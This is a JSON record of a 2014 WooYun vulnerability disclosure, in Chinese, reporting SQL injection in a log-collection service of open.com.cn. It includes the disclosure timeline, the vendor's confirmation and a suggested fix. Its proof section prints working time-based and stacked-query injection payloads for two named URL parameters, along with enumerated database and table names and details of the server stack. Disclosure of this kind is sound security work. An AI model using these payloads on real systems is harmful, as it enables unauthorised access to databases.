{"id": 50795, "wybug_id": "wooyun-2014-076790", "wybug_title": "OPEN.COM.CN SQL注入（二）", "wybug_corp": "open.com.cn", "wybug_author": "Feei", "wybug_date": "2014-09-21 10:49", "wybug_open_date": "2014-11-05 10:50", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-05：\t细节向公众公开  简要描述： 日志收集统计服务未对参数进行严格校验，导致存在SQL注入 详细说明：  登陆奥鹏学习中心后审查元素里发现一条特殊链接（看到这个IP和当前网站服务器不在一起，就觉得后面那两个参数可能存在注入）\n\n果不其然后面两个参数都存在注入\n\n   漏洞证明：  数据库[*] KYSMSClient[*] master[*] model[*] msdb[*] Northwind[*] pubs[*] subedu_log[*] tempdbDatabase: KYSMSClient[6 tables]+----------------------+| KY_INTERFACE_RECV    || KY_INTERFACE_USER    || K\\xc9_INTERFACE_SEND || dtproperties         || sysconstraints       || syssegments          |+----------------------+Database: Northwind+--------------------------------------+---------+| Table                                | Entries |+--------------------------------------+---------+| dbo.[Order Details Extended]         | 2155    || dbo.[Order Details]                  | 2155    || dbo.Invoices                         | 2155    || dbo.[Order Subtotals]                | 830     || dbo.[Orders Qry]                     | 830     || dbo.Orders                           | 830     || dbo.[Summary of Sales by Quarter]    | 809     || dbo.[Summary of Sales by Year]       | 809     || dbo.[Customer and Suppliers by City] | 120     || dbo.Customers                        | 91      || dbo.[Quarterly Orders]               | 86      || dbo.[Product Sales for 1997]         | 77      || dbo.[Sales by Category]              | 77      || dbo.Products                         | 77      || dbo.[Alphabetical list of products]  | 69      || dbo.[Products by Category]           | 69      || dbo.[Sales Totals by Amount]         | 66      || dbo.Territories                      | 54      || dbo.EmployeeTerritories              | 49      || dbo.sysconstraints                   | 43      || dbo.Suppliers                        | 29      || dbo.[Products Above Average Price]   | 25      || dbo.Employees                        | 9       || dbo.[Category Sales for 1997]        | 8       || dbo.Categories                       | 8       || dbo.Region                           | 4       || dbo.syssegments                      | 3       |+--------------------------------------+---------+相关信息：web server operating system: Windows 2003web application technology: Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2000current user:    'center'---Place: GETParameter: openstuno    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: serverip=T180SERVER&openstuno=201303606445'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: serverip=T180SERVER&openstuno=201303606445' WAITFOR DELAY '0:0:5'--Place: GETParameter: serverip    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: serverip=T180SERVER'; WAITFOR DELAY '0:0:5'--&openstuno=201303606445    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: serverip=T180SERVER' WAITFOR DELAY '0:0:5'--&openstuno=201303606445---存在基于时间和基于堆查询SQL注入漏洞   修复方案：  严格过滤相关参数或直接先上WAF   版权声明：转载请注明来源 Feei@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2014-09-26 08:16 厂商回复： 对研发无语了，人员更替管理跟不上 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}